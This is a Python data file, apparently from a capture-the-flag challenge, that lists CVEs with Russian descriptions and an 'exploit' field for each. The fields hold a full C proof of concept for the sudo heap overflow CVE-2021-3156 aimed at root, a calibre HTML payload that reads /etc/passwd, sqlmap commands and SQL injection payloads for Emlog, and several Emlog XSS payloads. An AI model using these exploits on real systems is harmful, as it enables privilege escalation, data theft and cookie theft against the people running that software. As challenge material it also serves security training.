import os
from dotenv import load_dotenv

FLAG = os.getenv('FLAG', 'mireactf{fake_flag}')

cves_dict = [{"cve_id": "CVE-2021-4034",
              "description": "В утилите pkexec компании polkit была обнаружена уязвимость локального повышения привилегий.",
              "exploit": FLAG},
             {"cve_id": "CVE-2021-3156",
              "description": "Sudo до версии 1.9.5p2 содержит случайную ошибку, которая может привести к переполнению буфера на основе кучи, что позволяет повысить привилегии до root с помощью sudoedit -s и аргумента командной строки, который заканчивается одним символом обратной косой черты.",
              "exploit": """//The below exploit worked on Ubuntu 20.04.1 LTS with ASLR turned on. For the exploitation of (sudo 1.8.31p2)
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define USER_BUFF_SIZE 0x30 // malloc() will allocate 0x40 bytes of size of the vulnerable chunk
#define ENVP_SIZE 52
#define OVERFLOW ((1072 - 0x30) + 0x2)//This is the offset to reach the service_user object allocated on the heap :)
#define LC_TIME_SIZE 100
#define LC_TIME "LC_TIME=C.UTF-8@"


int main(int argc, char **argv){
    char user_buff[USER_BUFF_SIZE];
    char *envp[ENVP_SIZE]; //Environment variable pointerz
    char lc_time_var[LC_TIME_SIZE];
    
    char overflow_buffer[OVERFLOW]; //overflow (padding) bufferz
    char library_name[] = "ffs/ffs";

    memset(user_buff, 'A', USER_BUFF_SIZE);
   

    user_buff[USER_BUFF_SIZE - 0x2] = 0x5c; //add "//"
    user_buff[USER_BUFF_SIZE - 0x1] = 0x0; // add a NULL-byte to terminate the command-line argz
   
    // overflow to the allocated chunk boundary
    memset(overflow_buffer, 'B', OVERFLOW);
    overflow_buffer[OVERFLOW - 0x2] = 0x5c;
    overflow_buffer[OVERFLOW - 0x1] = 0x0;

    strcpy(lc_time_var, LC_TIME);

    memset(lc_time_var + strlen(LC_TIME), 'B', LC_TIME_SIZE - strlen(LC_TIME));
    lc_time_var[LC_TIME_SIZE - 0x1] = 0x0;
       
    //copy all these stuff into ENVP variables
    
    envp[0] = overflow_buffer; //Buffer to overflow Heap :)
    
    for (int i = 1; i < ENVP_SIZE;i++)
            envp[i] = "\\";
  
    envp[ENVP_SIZE - 0x3] = library_name;
    envp[ENVP_SIZE - 0x2] = lc_time_var;
    envp[ENVP_SIZE - 0x1] = NULL;

    char *args[] = {"/usr/local/bin/sudoedit", "-s", user_buff, NULL};
   
    execve(args[0], args, envp);
    
    return 0;
}"""},
             {"cve_id": "CVE-2023-46303",
              "description": "link_to_local_path в ebooks/conversion/plugins/html_input.py в calibre до версии 6.19.0 по умолчанию можно добавлять ресурсы за пределами корневого каталога документа.",
              "exploit": """<img src="file:///etc/passwd">
<img src="http://ip-api.com/csv">"""},
             {"cve_id": "CVE-2023-41623",
              "description": "В Emlog версии pro2.1.14 была обнаружена уязвимость, связанная с внедрением SQL-кода с помощью параметра uid по адресу /admin/media.php.",
              "exploit": """CVE-2023-41623


[Discoverer]:wuhaozhe
[NAME OF AFFECTED PRODUCT(S)] :https://github.com/emlog/emlog

[AFFECTED AND/OR FIXED VERSION(S)] : https://github.com/emlog/emlog - pro2.1.14
[Affected Component] :Affected source code files:media ,The affected code:  $DB = Database::getInstance();$uid = Input::getStrVar('uid');,Affected url:/admin/media.php
[ Vulnerability Type]:sql inject
[Impact]:Attackers can detect internal information in the database


Method of reproducing vulnerabilities
  First, when I log in to the admin account, I find that  /admin/media.php? uid=1 This screen is used to view the user's uploaded picture. Because it is necessary to log in to the interface, so I use the burp tool to grab the request package of the administrator user to obtain the cookie, keep it in txt text, use sqlmap, the command is
    sqlmap -r (administrator request package txt) --batch --level 3.

I use sqlmap tool to scan and find the payload that can be used.

Then I can use parameter --dbs to query the information in its database.

sqlmap -r  /home/kali/nmapscan/cms.txt --batch --level 3 --dbs

> /admin/media.php?uid=1
> The following is the payload swept by sqlmap
> Type: error-based
>     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
>     Payload: uid=1 AND (SELECT 6975 FROM(SELECT COUNT(*),CONCAT(0x716b6b7a71,(SELECT (ELT(6975=6975,1))),0x716b787171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)


> Type: time-based blind
>     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
>     Payload: uid=1 AND (SELECT 6627 FROM (SELECT(SLEEP(5)))Rfyy)

> /admin/media.php?uid=1
> The following is the payload swept by sqlmap
> Parameter: uid (GET)
>     Type: boolean-based blind
>     Title: AND boolean-based blind - WHERE or HAVING clause
>     Payload: uid=1 AND 4765=4765
"""},
             {"cve_id": "CVE-2023-41621",
              "description": "Уязвимость для межсайтового скриптинга (XSS) была обнаружена в Emlog Pro версии 2.1.14 с помощью компонента /admin/store.php.",
              "exploit": """CVE-2023-41621
[Discoverer]:yunda&haozhe
[NAME OF AFFECTED PRODUCT(S)] :https://github.com/emlog/emlog
[AFFECTED AND/OR FIXED VERSION(S)] : https://github.com/emlog/emlog - pro2.1.14
[Affected Component] :The affected code: ?"onmouseover='alert(123)'bad=",Affected url:/admin/store.php
[Vulnerability Type]:Cross Site Scripting (XSS)
[Impact]:Stealing client cookies or engaging in phishing scams.

Method of reproducing vulnerabilities

Emlog Pro v2.1.14 was discovered to contain a cross-site scripting (XSS) vulnerability via the component /admin/store.php.

[Attack Vectors]
/admin/store.php?"onmouseover='alert(123)'bad=\""""},
             {"cve_id": "CVE-2023-41619",
              "description": "В Emlog Pro версии 2.1.14 была обнаружена уязвимость для межсайтового скриптинга (XSS) с помощью компонента /admin/article.php?action=write.",
              "exploit": """CVE-2023-41619
[Discoverer]:yunda&haozhe
[NAME OF AFFECTED PRODUCT(S)] :https://github.com/emlog/emlog
[AFFECTED AND/OR FIXED VERSION(S)] : https://github.com/emlog/emlog - pro2.1.14
[Affected Component] :
The affected code: Content-Disposition: form-data; name="top" y'"()&%<acx><ScRiPt >alert(123)</ScRiPt>,Affected url/admin/article.php?action=write
The affected code:y'"Content-Disposition: form-data; name="sortop" ()&%<acx><ScRiPt >alert(666)</ScRiPt>，Affected url/admin/article.php?action=write

[ Vulnerability Type]:Cross Site Scripting (XSS)
[Impact]:Stealing client cookies or engaging in phishing scams.



[Attack Vectors]
 After deploying the local environment, modify the passed data by building the following special post request, causing an xss  vulnerability under the page of the post function POST
JavaScript code can be inserted after the Content Disposition: position in the post request to form an xss attack
/admin/article_save.php The code directory that causes the vulnerability is allow_remark
 The URL contains xss vulnerability, which is triggered when the request content of the construction is below. I deployed the cms to replicate and found that the administrator interface part contains reflective xss



POST /admin/article_save.php 
Referer: http://ip/admin/article.php?action=write

Content-Disposition: form-data; name="top"
y'"()&%<acx><ScRiPt >alert(123)</ScRiPt>

or

Content-Disposition: form-data; name="sortop"
y'"()&%<acx><ScRiPt >alert(666)</ScRiPt>  

This location also has xss

or

Content-Disposition: form-data; name="allow_remark"

y'"()&%<acx><ScRiPt >alert(666)</ScRiPt>"""},
             {"cve_id": "CVE-2023-41618",
              "description": "Было обнаружено, что Emlog Pro версии 2.1.14 содержит уязвимость для межсайтового скриптинга (XSS) с помощью компонента /admin/article.php?active_savedraft.",
              "exploit": """CVE-2023-41618
[Discoverer]:wuhaozhe&yunda
[NAME OF AFFECTED PRODUCT(S)] :https://github.com/emlog/emlog
[AFFECTED AND/OR FIXED VERSION(S)] : https://github.com/emlog/emlog - pro2.1.14
[Affected Component] :The affected code: %27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(9864)%3C/ScRiPt%3E&draft=1,Affected url:/admin/article.php?active_savedraft=1
[ Vulnerability Type]:Cross Site Scripting (XSS)
[Impact]:Stealing client cookies or engaging in phishing scams.

Method of reproducing vulnerabilities
Emlog Pro v2.1.14 was discovered to contain a reflective cross-site
scripting (XSS) vulnerability via the component
/admin/article.php?active_savedraft=1
There is an xss attack on this URL

for example:
/admin/article.php?active_savedraft=1%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(9864)%3C/ScRiPt%3E&draft=1
You can change your JavaScript code to transform your attack content"""}
             ]
